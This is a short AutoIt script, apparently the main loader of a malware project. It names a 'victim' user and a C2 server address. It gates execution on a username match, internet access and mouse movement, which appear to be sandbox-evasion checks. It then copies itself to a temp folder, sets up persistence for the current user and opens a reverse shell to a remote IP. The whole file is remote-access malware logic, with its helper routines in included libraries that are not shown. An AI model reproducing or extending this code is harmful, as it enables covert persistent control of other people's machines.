#include "libs/settings.au3"
#include "libs/network.au3"
#include "libs/info.au3"
#include "libs/files.au3"
#include "libs/misc.au3"

$victim = "test"
$c2server = "192.168.0.1"

if isRunningFromTemp() Then

   SetPersistent4CurrentUser()

   ReverseShell($RemoteIp)

Else

   if AmIusername($victim) Then

	  if InternetCheck() Then

		 if DetectMouseMoving() Then

			MessageBox("Debug","Hi!")

			CopyTempRun()

		 EndIf

	  EndIf

   EndIf

EndIf